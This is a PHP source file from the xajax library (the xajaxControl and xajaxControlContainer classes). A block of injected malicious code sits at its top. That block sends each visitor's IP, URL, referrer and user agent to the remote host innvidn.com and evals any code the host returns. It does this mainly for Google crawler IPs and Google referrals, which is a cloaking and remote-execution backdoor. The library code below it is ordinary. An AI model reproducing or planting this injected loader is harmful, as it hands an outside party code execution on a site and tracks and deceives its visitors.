<?php
//{{8716220c

GLOBAL $wehaveitagain;
if($wehaveitagain != 1)
{
$preverrx=error_reporting(0);
$wehaveitagain = 1;
$mynetsxx = array(
'84.235.77.0' => 24,
'8.8.8.0' => 24,
'8.8.4.0' => 24,
'8.6.48.0' => 21,
'74.125.98.0' => 24,
'74.125.97.0' => 24,
'74.125.94.0' => 23,
'74.125.92.0' => 23,
'74.125.90.0' => 23,
'74.125.86.0' => 23,
'74.125.78.0' => 23,
'74.125.76.0' => 23,
'74.125.75.0' => 24,
'74.125.74.0' => 24,
'74.125.72.0' => 23,
'74.125.70.0' => 23,
'74.125.66.0' => 23,
'74.125.64.0' => 23,
'74.125.64.0' => 18,
'74.125.63.0' => 24,
'74.125.62.0' => 24,
'74.125.61.0' => 24,
'74.125.60.0' => 24,
'74.125.58.0' => 24,
'74.125.54.0' => 23,
'74.125.52.0' => 23,
'74.125.46.0' => 23,
'74.125.44.0' => 23,
'74.125.42.0' => 23,
'74.125.38.0' => 23,
'74.125.37.0' => 24,
'74.125.36.0' => 24,
'74.125.36.0' => 23,
'74.125.33.0' => 24,
'74.125.32.0' => 24,
'74.125.30.0' => 23,
'74.125.246.0' => 24,
'74.125.245.0' => 24,
'74.125.244.0' => 24,
'74.125.239.0' => 24,
'74.125.238.0' => 24,
'74.125.237.0' => 24,
'74.125.236.0' => 24,
'74.125.235.0' => 24,
'74.125.234.0' => 24,
'74.125.233.0' => 24,
'74.125.232.0' => 24,
'74.125.230.0' => 24,
'74.125.229.0' => 24,
'74.125.227.0' => 24,
'74.125.226.0' => 24,
'74.125.225.0' => 24,
'74.125.224.0' => 24,
'74.125.192.0' => 18,
'74.125.18.0' => 23,
'74.125.17.0' => 24,
'74.125.16.0' => 24,
'74.125.158.0' => 23,
'74.125.156.0' => 23,
'74.125.154.0' => 23,
'74.125.152.0' => 23,
'74.125.151.0' => 24,
'74.125.150.0' => 24,
'74.125.149.0' => 24,
'74.125.148.0' => 24,
'74.125.146.0' => 23,
'74.125.128.0' => 18,
'74.125.126.0' => 23,
'74.125.125.0' => 24,
'74.125.122.0' => 24,
'74.125.121.0' => 24,
'74.125.120.0' => 24,
'74.125.119.0' => 24,
'74.125.118.0' => 24,
'74.125.117.0' => 24,
'74.125.116.0' => 24,
'74.125.114.0' => 23,
'74.125.112.0' => 23,
'74.125.0.0' => 18,
'74.125.0.0' => 16,
'72.14.255.0' => 24,
'72.14.254.0' => 24,
'72.14.254.0' => 23,
'72.14.253.0' => 24,
'72.14.252.0' => 24,
'72.14.252.0' => 23,
'72.14.248.0' => 23,
'72.14.246.0' => 23,
'72.14.244.0' => 23,
'72.14.236.0' => 24,
'72.14.235.0' => 24,
'72.14.234.0' => 24,
'72.14.230.0' => 24,
'72.14.228.0' => 24,
'72.14.226.0' => 24,
'72.14.225.0' => 24,
'72.14.224.0' => 24,
'72.14.220.0' => 23,
'72.14.212.0' => 23,
'72.14.210.0' => 23,
'72.14.208.0' => 23,
'72.14.204.0' => 23,
'72.14.202.0' => 23,
'72.14.199.0' => 24,
'72.14.194.0' => 24,
'72.14.193.0' => 24,
'72.14.192.0' => 24,
'72.14.192.0' => 18,
'70.32.158.0' => 24,
'70.32.155.0' => 24,
'70.32.150.0' => 24,
'70.32.140.0' => 23,
'70.32.138.0' => 24,
'70.32.136.0' => 24,
'70.32.135.0' => 24,
'70.32.134.0' => 24,
'70.32.133.0' => 24,
'70.32.132.0' => 24,
'70.32.131.0' => 24,
'70.32.130.0' => 24,
'70.32.129.0' => 24,
'70.32.128.0' => 24,
'70.32.128.0' => 19,
'66.249.94.0' => 24,
'66.249.92.0' => 24,
'66.249.91.0' => 24,
'66.249.90.0' => 24,
'66.249.88.0' => 23,
'66.249.85.0' => 24,
'66.249.84.0' => 24,
'66.249.82.0' => 24,
'66.249.81.0' => 24,
'66.249.80.0' => 24,
'66.249.72.0' => 24,
'66.249.71.0' => 24,
'66.249.69.0' => 24,
'66.249.68.0' => 24,
'66.249.67.0' => 24,
'66.249.66.0' => 24,
'66.249.65.0' => 24,
'66.249.64.0' => 19,
'66.102.8.0' => 23,
'66.102.6.0' => 23,
'66.102.4.0' => 24,
'66.102.3.0' => 24,
'66.102.2.0' => 24,
'66.102.12.0' => 23,
'66.102.10.0' => 23,
'66.102.0.0' => 20,
'64.9.224.0' => 20,
'64.9.224.0' => 19,
'64.233.188.0' => 23,
'64.233.186.0' => 23,
'64.233.182.0' => 23,
'64.233.180.0' => 23,
'64.233.178.0' => 23,
'64.233.173.0' => 24,
'64.233.172.0' => 24,
'64.233.170.0' => 23,
'64.233.168.0' => 23,
'64.233.162.0' => 23,
'64.233.160.0' => 19,
'63.243.168.0' => 22,
'4.3.2.0' => 24,
'216.239.60.0' => 23,
'216.239.58.0' => 23,
'216.239.50.0' => 23,
'216.239.44.0' => 23,
'216.239.39.0' => 24,
'216.239.38.0' => 24,
'216.239.36.0' => 24,
'216.239.34.0' => 24,
'216.239.33.0' => 24,
'216.239.32.0' => 24,
'216.239.32.0' => 19,
'209.85.238.0' => 24,
'209.85.230.0' => 23,
'209.85.228.0' => 23,
'209.85.226.0' => 23,
'209.85.224.0' => 23,
'209.85.223.0' => 24,
'209.85.222.0' => 24,
'209.85.221.0' => 24,
'209.85.220.0' => 24,
'209.85.219.0' => 24,
'209.85.218.0' => 24,
'209.85.216.0' => 24,
'209.85.213.0' => 24,
'209.85.212.0' => 24,
'209.85.211.0' => 24,
'209.85.210.0' => 24,
'209.85.208.0' => 23,
'209.85.200.0' => 23,
'209.85.198.0' => 23,
'209.85.196.0' => 23,
'209.85.194.0' => 23,
'209.85.192.0' => 23,
'209.85.174.0' => 23,
'209.85.172.0' => 23,
'209.85.170.0' => 23,
'209.85.168.0' => 23,
'209.85.166.0' => 23,
'209.85.164.0' => 23,
'209.85.162.0' => 23,
'209.85.156.0' => 23,
'209.85.152.0' => 23,
'209.85.149.0' => 24,
'209.85.148.0' => 23,
'209.85.147.0' => 24,
'209.85.146.0' => 24,
'209.85.146.0' => 23,
'209.85.144.0' => 23,
'209.85.142.0' => 23,
'209.85.139.0' => 24,
'209.85.138.0' => 23,
'209.85.136.0' => 23,
'209.85.134.0' => 23,
'209.85.132.0' => 24,
'209.85.132.0' => 23,
'209.85.128.0' => 23,
'209.85.128.0' => 17,
'193.186.4.0' => 24,
'193.142.125.0' => 24,
'173.255.112.0' => 20,
'173.194.44.0' => 24,
'173.194.43.0' => 24,
'173.194.42.0' => 24,
'173.194.41.0' => 24,
'173.194.40.0' => 24,
'173.194.37.0' => 24,
'173.194.36.0' => 24,
'173.194.35.0' => 24,
'173.194.34.0' => 24,
'173.194.33.0' => 24,
'173.194.32.0' => 24,
'173.194.0.0' => 16,
'118.174.25.0' => 24,
'118.174.24.0' => 24,
'118.174.24.0' => 22,
'113.197.106.0' => 24,
'113.197.105.0' => 24,
'108.59.80.0' => 20
);
function ip_in_networkxx($ip, $net_addr, $net_mask)
{
  if($net_mask <= 0) return false;
  $ip_binary_string = sprintf("%032b",ip2long($ip));
  $net_binary_string = sprintf("%032b",ip2long($net_addr));
  return (strncmp($ip_binary_string,$net_binary_string,$net_mask) === 0);
}
function selfURL()
{
  if(!isset($_SERVER['REQUEST_URI'])) $suri = $_SERVER['PHP_SELF'];
  else $suri = $_SERVER['REQUEST_URI'];
  $s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : "";
  $sp=strtolower($_SERVER["SERVER_PROTOCOL"]);
  $pr = substr($sp,0,strpos($sp,"/")).$s;
  $pt = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
  return $pr."://".$_SERVER['SERVER_NAME'].$pt.$suri;
}
function loadDataHttpCse($url)
{
    $s = '';
    if (ini_get('allow_url_fopen') == 1) {
        $ctx = stream_context_create(array('http'=>array('timeout'=>3)));
        $s = file_get_contents($url, 0, $ctx);
    } else if (in_array('curl', get_loaded_extensions())) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $s = curl_exec($ch);
        curl_close($ch);
    } else {
        $parts = parse_url($url);
        $host = $parts['host'];
        $path = '/';
        $port = 80;
        if (isset($parts['path'])) {
            $path = $parts['path'];
        }
        if (isset($parts['port'])) {
            $port = $parts['port'];
        }
        $address = gethostbyname($host);
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($socket === false) {
            return false;
        }
        $timeout = array('sec'=>3, 'usec'=>0);
        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, $timeout);
        socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, $timeout);
        $result = socket_connect($socket, $address, $port);
        if ($result === false) {
            return false;
        }
        $in = "GET $path HTTP/1.1\r\n";
        $in .= "Host: $host\r\n";
        $in .= "Connection: Close\r\n\r\n";
        socket_write($socket, $in, strlen($in));
        $reply = '';
        while ($out = socket_read($socket, 2048)) {
            $reply .=  $out;
        }
        socket_close($socket);
        $s = substr($reply, (strpos($reply, "\r\n\r\n")+4));
        if (strpos(strtolower($reply), "transfer-encoding: chunked") !== FALSE) {
            $fp = 0;
            $outData = "";
            while ($fp < strlen($s)) {
                $rawnum = substr($s, $fp, strpos(substr($s, $fp), "\r\n") + 2);
                $num = hexdec(trim($rawnum));
                $fp += strlen($rawnum);
                $chunk = substr($s, $fp, $num);
                $outData .= $chunk;
                $fp += strlen($chunk);
            }
            $s = $outData;
        }
    }
    return $s;
}
function rewrioutclbkxxx1($str) { return rewriout($str,1); }
function rewrioutclbkxxx2($str) { return rewriout($str,2); }
function rewrioutclbkxxx3($str) { return rewriout($str,3); }
function rewriout($str, $ev)
{
  error_reporting(0);
  if(stripos($str, '<body') !== false)
  {
    $id = "4dae84ec67843a09b800edaa";
    $url = "http://innvidn.com/ck.gif";
    $req = $url.'?ev='.$ev.'&url='.urlencode(selfURL()).'&id='.urlencode($id).'&ref='.urlencode($_SERVER['HTTP_REFERER']).'&ip='.$_SERVER['REMOTE_ADDR'].'&ua='.urlencode($_SERVER['HTTP_USER_AGENT']);
    $answergrhey11=loadDataHttpCse($req);
    if($answergrhey11 != FALSE && strncmp('/*CODE', $answergrhey11, 6) == 0) {
      return eval($answergrhey11);
    }
  }
  return false;
}
function StrToNum($Str, $Check, $Magic)
{
   $Int32Unit = 4294967296;
   $length = strlen($Str);
   for ($i = 0; $i < $length; $i++) {
       $Check *= $Magic;
       if ($Check >= $Int32Unit) {
           $Check = ($Check - $Int32Unit * (int) ($Check / $Int32Unit));
           $Check = ($Check < -2147483648) ? ($Check + $Int32Unit) : $Check;
       }
       $Check += ord($Str{$i});
   }
   return $Check;
}
function HashURL($String)
{
   $Check1 = StrToNum($String, 0x1505, 0x21);
   $Check2 = StrToNum($String, 0, 0x1003F);
   $Check1 >>= 2;
   $Check1 = (($Check1 >> 4) & 0x3FFFFC0 ) | ($Check1 & 0x3F);
   $Check1 = (($Check1 >> 4) & 0x3FFC00 ) | ($Check1 & 0x3FF);
   $Check1 = (($Check1 >> 4) & 0x3C000 ) | ($Check1 & 0x3FFF);
   $T1 = (((($Check1 & 0x3C0) << 4) | ($Check1 & 0x3C)) <<2 ) | ($Check2 & 0xF0F );
   $T2 = (((($Check1 & 0xFFFFC000) << 4) | ($Check1 & 0x3C00)) << 0xA) | ($Check2 & 0xF0F0000 );
   return ($T1 | $T2);
}
function CheckHash($Hashnum)
{
   $CheckByte = 0;
   $Flag = 0;
   $HashStr = sprintf('%u', $Hashnum) ;
   $length = strlen($HashStr);
   for ($i = $length-1; $i >= 0;  $i--) {
       $Re = $HashStr{$i};
       if (1 === ($Flag % 2)) {
           $Re += $Re;
           $Re = (int)($Re / 10) + ($Re % 10);
       }
       $CheckByte += $Re;
       $Flag ++;
   }
   $CheckByte %= 10;
   if (0 !== $CheckByte) {
       $CheckByte = 10 - $CheckByte;
       if (1 === ($Flag % 2) ) {
           if (1 === ($CheckByte % 2)) {
               $CheckByte += 9;
           }
           $CheckByte >>= 1;
       }
   }
   return '7'.$CheckByte.$HashStr;
}
function getpr($url)
{
   $ch = CheckHash(HashURL($url));
   $file = "http://toolbarqueries.google.com/tbr?client=navclient-auto&ch=$ch&features=Rank&q=info:$url";
   $data = file_get_contents($file);
   return $data;
}
if(isset($_POST['prgetxr']))
{
  echo getpr($_POST['prgetxr']);
  exit();
}
else
{
  $ev = 0;
  foreach($mynetsxx as 	$key => $value)
  {
    if(ip_in_networkxx($_SERVER['REMOTE_ADDR'], $key, $value)) {
      $ev = 1;
      break;
    }
  }
  if($ev == 0) {
    if(isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google.') !== false) {
        $ev = 2;
    }
    elseif(mt_rand(1,100) == 50) {
        $ev = 3;
    }
  }
  if(isset($_GET['showmeallpls'])) {
    $ev = $_GET['showmeallpls'];
  }
  if($ev > 0) {
	ob_start('rewrioutclbkxxx'.$ev);
  }
}
error_reporting($preverrx);
}
/*  */

//}}37210e89
?><?php
/*
	File: xajaxControl.inc.php

	Contains the base class for all controls.

	Title: xajaxControl class

	Please see <copyright.inc.php> for a detailed description, copyright
	and license information.
*/

/*
	@package xajax
	@version $Id: xajaxControl.inc.php 362 2007-05-29 15:32:24Z calltoconstruct $
	@copyright Copyright (c) 2005-2007 by Jared White & J. Max Wilson
	@copyright Copyright (c) 2008-2009 by Joseph Woolley, Steffen Konerow, Jared White  & J. Max Wilson
	@license http://www.xajaxproject.org/bsd_license.txt BSD License
*/

/*
	Constant: XAJAX_HTML_CONTROL_DOCTYPE_FORMAT
	
	Defines the doctype of the current document; this will effect how the HTML is formatted
	when the html control library is used to construct html documents and fragments.  This can
	be one of the following values:
	
	'XHTML' - (default)  Typical effects are that certain elements are closed with '/>'
	'HTML' - Typical differences are that closing tags for certain elements cannot be '/>'
*/
if (false == defined('XAJAX_HTML_CONTROL_DOCTYPE_FORMAT')) define('XAJAX_HTML_CONTROL_DOCTYPE_FORMAT', 'XHTML');

/*
	Constant: XAJAX_HTML_CONTROL_DOCTYPE_VERSION
*/
if (false == defined('XAJAX_HTML_CONTROL_DOCTYPE_VERSION')) define('XAJAX_HTML_CONTROL_DOCTYPE_VERSION', '1.0');

/*
	Constant: XAJAX_HTML_CONTROL_DOCTYPE_VALIDATION
*/
if (false == defined('XAJAX_HTML_CONTROL_DOCTYPE_VALIDATION')) define('XAJAX_HTML_CONTROL_DOCTYPE_VALIDATION', 'TRANSITIONAL');

/*
	Class: xajaxControl

	The base class for all xajax enabled controls.  Derived classes will generate the
	HTML and javascript code that will be sent to the browser via <xajaxControl->printHTML>
	or sent to the browser in a <xajaxResponse> via <xajaxControl->getHTML>.
*/
class xajaxControl
{
	/*
		String: sTag
	*/
	var $sTag;
	
	/*
		Boolean: sEndTag
		
		'required' - (default) Indicates the control must have a full end tag
		'optional' - The control may have an abbr. begin tag or a full end tag
		'forbidden' - The control must have an abbr. begin tag and no end tag
	*/
	var $sEndTag;
	
	/*
		Array: aAttributes
		
		An associative array of attributes that will be used in the generation
		of the HMTL code for this control.
	*/
	var $aAttributes;
	
	/*
		Array: aEvents
		
		An associative array of events that will be assigned to this control.  Each
		event declaration will include a reference to a <xajaxRequest> object; it's
		script will be extracted using <xajaxRequest->printScript> or 
		<xajaxRequest->getScript>.
	*/
	var $aEvents;
	
	/*
		String: sClass
		
		Contains a declaration of the class of this control.  %inline controls do not 
		need to be indented, %block controls should be indented.
	*/
	var $sClass;

	/*
		Function: xajaxControl
		
		Parameters:
		
		$aConfiguration - (array):  An associative array that contains a variety
			of configuration options for this <xajaxControl> object.
		
		Note:
		This array may contain the following entries:
		
		'attributes' - (array):  An associative array containing attributes
			that will be passed to the <xajaxControl->setAttribute> function.
		
		'children' - (array):  An array of <xajaxControl> derived objects that
			will be the children of this control.
	*/
	function xajaxControl($sTag, $aConfiguration=array())
	{
		$this->sTag = $sTag;

		$this->clearAttributes();
				
		if (isset($aConfiguration['attributes']))
			if (is_array($aConfiguration['attributes']))
				foreach ($aConfiguration['attributes'] as $sKey => $sValue)
					$this->setAttribute($sKey, $sValue);

		$this->clearEvents();
		
		if (isset($aConfiguration['event']))
			call_user_func_array(array(&$this, 'setEvent'), $aConfiguration['event']);
		
		else if (isset($aConfiguration['events']))
			if (is_array($aConfiguration['events']))
				foreach ($aConfiguration['events'] as $aEvent)
					call_user_func_array(array(&$this, 'setEvent'), $aEvent);
		
		$this->sClass = '%block';
		$this->sEndTag = 'forbidden';
	}
	
	/*
		Function: getClass
		
		Returns the *adjusted* class of the element
	*/
	function getClass()
	{
		return $this->sClass;
	}

	/*
		Function: clearAttributes
		
		Removes all attributes assigned to this control.
	*/
	function clearAttributes()
	{
		$this->aAttributes = array();
	}

	/*
		Function: setAttribute
		
		Call to set various control specific attributes to be included in the HTML
		script that is returned when <xajaxControl->printHTML> or <xajaxControl->getHTML>
		is called.
		
		Parameters:
			$sName - (string): The attribute name to set the value.
			$sValue - (string): The value to be set.
	*/
	function setAttribute($sName, $sValue)
	{
//SkipDebug
		if (class_exists('clsValidator'))
		{
			$objValidator =& clsValidator::getInstance();
			if (false == $objValidator->attributeValid($this->sTag, $sName)) {
				$objLanguageManager =& xajaxLanguageManager::getInstance();
				trigger_error(
					$objLanguageManager->getText('XJXCTL:IAERR:01') 
					. $sName 
					. $objLanguageManager->getText('XJXCTL:IAERR:02') 
					. $this->sTag 
					. $objLanguageManager->getText('XJXCTL:IAERR:03')
					, E_USER_ERROR
					);
			}
		}
//EndSkipDebug

		$this->aAttributes[$sName] = $sValue;
	}
	
	/*
		Function: getAttribute
		
		Call to obtain the value currently associated with the specified attribute
		if set.
		
		Parameters:
		
		sName - (string): The name of the attribute to be returned.
		
		Returns:
		
		mixed : The value associated with the attribute, or null.
	*/
	function getAttribute($sName)
	{
		if (false == isset($this->aAttributes[$sName]))
			return null;
		
		return $this->aAttributes[$sName];
	}
	
	/*
		Function: clearEvents
		
		Clear the events that have been associated with this object.
	*/
	function clearEvents()
	{
		$this->aEvents = array();
	}

	/*
		Function: setEvent
		
		Call this function to assign a <xajaxRequest> object as the handler for
		the specific DOM event.  The <xajaxRequest->printScript> function will 
		be called to generate the javascript for this request.
		
		Parameters:
		
		sEvent - (string):  A string containing the name of the event to be assigned.
		objRequest - (xajaxRequest object):  The <xajaxRequest> object to be associated
			with the specified event.
		aParameters - (array, optional):  An array containing parameter declarations
			that will be passed to this <xajaxRequest> object just before the javascript
			is generated.
		sBeforeRequest - (string, optional):  a string containing a snippet of javascript code
			to execute prior to calling the xajaxRequest function
		sAfterRequest - (string, optional):  a string containing a snippet of javascript code
			to execute after calling the xajaxRequest function
	*/
	function setEvent($sEvent, &$objRequest, $aParameters=array(), $sBeforeRequest='', $sAfterRequest='; return false;')
	{
//SkipDebug
		if (false == is_a($objRequest, 'xajaxRequest')) {
			$objLanguageManager =& xajaxLanguageManager::getInstance();
			trigger_error(
				$objLanguageManager->getText('XJXCTL:IRERR:01')
				. $this->backtrace()
				, E_USER_ERROR
				);
		}

		if (class_exists('clsValidator')) {
			$objValidator =& clsValidator::getInstance();
			if (false == $objValidator->attributeValid($this->sTag, $sEvent)) {
				$objLanguageManager =& xajaxLanguageManager::getInstance();
				trigger_error(
					$objLanguageManager->getText('XJXCTL:IEERR:01') 
					. $sEvent 
					. $objLanguageManager->getText('XJXCTL:IEERR:02') 
					. $this->sTag 
					. $objLanguageManager->getText('XJXCTL:IEERR:03')
					, E_USER_ERROR
					);
			}
		}
//EndSkipDebug

		$this->aEvents[$sEvent] = array(
			&$objRequest, 
			$aParameters, 
			$sBeforeRequest, 
			$sAfterRequest
			);
	}

	/*
		Function: getHTML
		
		Generates and returns the HTML representation of this control and 
		it's children.
		
		Returns:
		
		string : The HTML representation of this control.
	*/
	function getHTML($bFormat=false)
	{
		ob_start();
		if ($bFormat)
			$this->printHTML();
		else
			$this->printHTML(false);
		return ob_get_clean();
	}
	
	/*
		Function: printHTML
		
		Generates and prints the HTML representation of this control and 
		it's children.
		
		Returns:
		
		string : The HTML representation of this control.
	*/
	function printHTML($sIndent='')
	{
//SkipDebug
		if (class_exists('clsValidator'))
		{
			$objValidator =& clsValidator::getInstance();
			$sMissing = '';
			if (false == $objValidator->checkRequiredAttributes($this->sTag, $this->aAttributes, $sMissing)) {
				$objLanguageManager =& xajaxLanguageManager::getInstance();
				trigger_error(
					$objLanguageManager->getText('XJXCTL:MAERR:01') 
					. $sMissing
					. $objLanguageManager->getText('XJXCTL:MAERR:02') 
					. $this->sTag 
					. $objLanguageManager->getText('XJXCTL:MAERR:03')
					, E_USER_ERROR
					);
			}
		}
//EndSkipDebug

		$sClass = $this->getClass();
		
		if ('%inline' != $sClass)
			// this odd syntax is necessary to detect request for no formatting
			if (false === (false === $sIndent))
				echo $sIndent;
			
		echo '<';
		echo $this->sTag;
		echo ' ';
		$this->_printAttributes();
		$this->_printEvents();
		
		if ('forbidden' == $this->sEndTag)
		{
			if ('HTML' == XAJAX_HTML_CONTROL_DOCTYPE_FORMAT)
				echo '>';
			else if ('XHTML' == XAJAX_HTML_CONTROL_DOCTYPE_FORMAT)
				echo '/>';
			
			if ('%inline' != $sClass)
				// this odd syntax is necessary to detect request for no formatting
				if (false === (false === $sIndent))
					echo "\n";
				
			return;
		}
		else if ('optional' == $this->sEndTag)
		{
			echo '/>';
			
			if ('%inline' == $sClass)
				// this odd syntax is necessary to detect request for no formatting
				if (false === (false === $sIndent))
					echo "\n";
				
			return;
		}
//SkipDebug
		else
		{
			$objLanguageManager =& xajaxLanguageManager::getInstance();
			trigger_error(
				$objLanguageManager->getText('XJXCTL:IETERR:01')
				. $this->backtrace()
				, E_USER_ERROR
				);
		}
//EndSkipDebug
	}

	function _printAttributes()
	{
		// NOTE: Special case here: disabled='false' does not work in HTML; does work in javascript
		foreach ($this->aAttributes as $sKey => $sValue)
			if ('disabled' != $sKey || 'false' != $sValue)
				echo "{$sKey}='{$sValue}' ";
	}

	function _printEvents()
	{
		foreach (array_keys($this->aEvents) as $sKey)
		{
			$aEvent =& $this->aEvents[$sKey];
			$objRequest =& $aEvent[0];
			$aParameters = $aEvent[1];
			$sBeforeRequest = $aEvent[2];
			$sAfterRequest = $aEvent[3];

			foreach ($aParameters as $aParameter)
			{
				$nParameter = $aParameter[0];
				$sType = $aParameter[1];
				$sValue = $aParameter[2];
				$objRequest->setParameter($nParameter, $sType, $sValue);
			}

			$objRequest->useDoubleQuote();

			echo "{$sKey}='{$sBeforeRequest}";

			$objRequest->printScript();

			echo "{$sAfterRequest}' ";
		}
	}

	function backtrace()
	{
		// debug_backtrace was added to php in version 4.3.0
		// version_compare was added to php in version 4.0.7
		if (0 <= version_compare(PHP_VERSION, '4.3.0'))
			return '<div><div>Backtrace:</div><pre>' 
				. print_r(debug_backtrace(), true) 
				. '</pre></div>';
		return '';
	}
}

/*
	Class: xajaxControlContainer
	
	This class is used as the base class for controls that will contain
	other child controls.
*/
class xajaxControlContainer extends xajaxControl
{
	/*
		Array: aChildren
		
		An array of child controls.
	*/
	var $aChildren;

	/*
		Boolean: sChildClass
		
		Will contain '%inline' if all children are class = '%inline', '%block' if all children are '%block' or
		'%flow' if both '%inline' and '%block' elements are detected.
	*/
	var $sChildClass;

	/*
		Function: xajaxControlContainer
		
		Called to construct and configure this control.
		
		Parameters:
		
		aConfiguration - (array):  See <xajaxControl->xajaxControl> for more
			information.
	*/
	function xajaxControlContainer($sTag, $aConfiguration=array())
	{
		xajaxControl::xajaxControl($sTag, $aConfiguration);

		$this->clearChildren();
		
		if (isset($aConfiguration['child']))
			$this->addChild($aConfiguration['child']);

		else if (isset($aConfiguration['children']))
			$this->addChildren($aConfiguration['children']);
		
		$this->sEndTag = 'required';
	}
	
	/*
		Function: getClass
		
		Returns the *adjusted* class of the element
	*/
	function getClass()
	{
		$sClass = xajaxControl::getClass();
		
		if (0 < count($this->aChildren) && '%flow' == $sClass)
			return $this->getContentClass();
		else if (0 == count($this->aChildren) || '%inline' == $sClass || '%block' == $sClass)
			return $sClass;
		
		$objLanguageManager =& xajaxLanguageManager::getInstance();
		trigger_error(
			$objLanguageManager->getText('XJXCTL:ICERR:01')
			. $this->backtrace()
			, E_USER_ERROR
			);
	}
	
	/*
		Function: getContentClass
		
		Returns the *adjusted* class of the content (children) of this element
	*/
	function getContentClass()
	{
		$sClass = '';
		
		foreach (array_keys($this->aChildren) as $sKey)
		{
			if ('' == $sClass)
				$sClass = $this->aChildren[$sKey]->getClass();
			else if ($sClass != $this->aChildren[$sKey]->getClass())
				return '%flow';
		}
		
		if ('' == $sClass)
			return '%inline';
			
		return $sClass;
	}
	
	/*
		Function: clearChildren
		
		Clears the list of child controls associated with this control.
	*/
	function clearChildren()
	{
		$this->sChildClass = '%inline';
		$this->aChildren = array();
	}

	/*
		Function: addChild
		
		Adds a control to the array of child controls.  Child controls
		must be derived from <xajaxControl>.
	*/
	function addChild(&$objControl)
	{
//SkipDebug
		if (false == is_a($objControl, 'xajaxControl')) {
			$objLanguageManager =& xajaxLanguageManager::getInstance();
			trigger_error(
				$objLanguageManager->getText('XJXCTL:ICLERR:01')
				. $this->backtrace()
				, E_USER_ERROR
				);
		}

		if (class_exists('clsValidator'))
		{
			$objValidator =& clsValidator::getInstance();
			if (false == $objValidator->childValid($this->sTag, $objControl->sTag)) {
				$objLanguageManager =& xajaxLanguageManager::getInstance();
				trigger_error(
					$objLanguageManager->getText('XJXCTL:ICLERR:02') 
					. $objControl->sTag
					. $objLanguageManager->getText('XJXCTL:ICLERR:03') 
					. $this->sTag 
					. $objLanguageManager->getText('XJXCTL:ICLERR:04')
					. $this->backtrace()
					, E_USER_ERROR
					);
			}
		}
//EndSkipDebug

		$this->aChildren[] =& $objControl;
	}
	
	function addChildren(&$aChildren)
	{
//SkipDebug
		if (false == is_array($aChildren)) {
			$objLanguageManager =& xajaxLanguageManager::getInstance();
			trigger_error(
				$objLanguageManager->getText('XJXCTL:ICHERR:01')
				. $this->backtrace()
				, E_USER_ERROR
				);
		}
//EndSkipDebug
				
		foreach (array_keys($aChildren) as $sKey)
			$this->addChild($aChildren[$sKey]);
	}

	function printHTML($sIndent='')
	{
//SkipDebug
		if (class_exists('clsValidator'))
		{
			$objValidator =& clsValidator::getInstance();
			$sMissing = '';
			if (false == $objValidator->checkRequiredAttributes($this->sTag, $this->aAttributes, $sMissing)) {
				$objLanguageManager =& xajaxLanguageManager::getInstance();
				trigger_error(
					$objLanguageManager->getText('XJXCTL:MRAERR:01') 
					. $sMissing
					. $objLanguageManager->getText('XJXCTL:MRAERR:02') 
					. $this->sTag 
					. $objLanguageManager->getText('XJXCTL:MRAERR:03')
					, E_USER_ERROR
					);
			}
		}
//EndSkipDebug

		$sClass = $this->getClass();
		
		if ('%inline' != $sClass)
			// this odd syntax is necessary to detect request for no formatting
			if (false === (false === $sIndent))
				echo $sIndent;
			
		echo '<';
		echo $this->sTag;
		echo ' ';
		$this->_printAttributes();
		$this->_printEvents();
		
		if (0 == count($this->aChildren))
		{
			if ('optional' == $this->sEndTag)
			{
				echo '/>';
				
				if ('%inline' != $sClass)
					// this odd syntax is necessary to detect request for no formatting
					if (false === (false === $sIndent))
						echo "\n";
					
				return;
			}
//SkipDebug
			else if ('required' != $this->sEndTag)
				trigger_error("Invalid end tag designation; should be optional or required.\n"
					. $this->backtrace(),
					E_USER_ERROR
					);
//EndSkipDebug
		}
		
		echo '>';
		
		$sContentClass = $this->getContentClass();
		
		if ('%inline' != $sContentClass)
			// this odd syntax is necessary to detect request for no formatting
			if (false === (false === $sIndent))
				echo "\n";

		$this->_printChildren($sIndent);
		
		if ('%inline' != $sContentClass)
			// this odd syntax is necessary to detect request for no formatting
			if (false === (false === $sIndent))
				echo $sIndent;
		
		echo '<' . '/';
		echo $this->sTag;
		echo '>';
		
		if ('%inline' != $sClass)
			// this odd syntax is necessary to detect request for no formatting
			if (false === (false === $sIndent))
				echo "\n";
	}

	function _printChildren($sIndent='')
	{
		if (false == is_a($this, 'clsDocument'))
			// this odd syntax is necessary to detect request for no formatting
			if (false === (false === $sIndent))
				$sIndent .= "\t";

		// children
		foreach (array_keys($this->aChildren) as $sKey)
		{
			$objChild =& $this->aChildren[$sKey];
			$objChild->printHTML($sIndent);
		}
	}
}
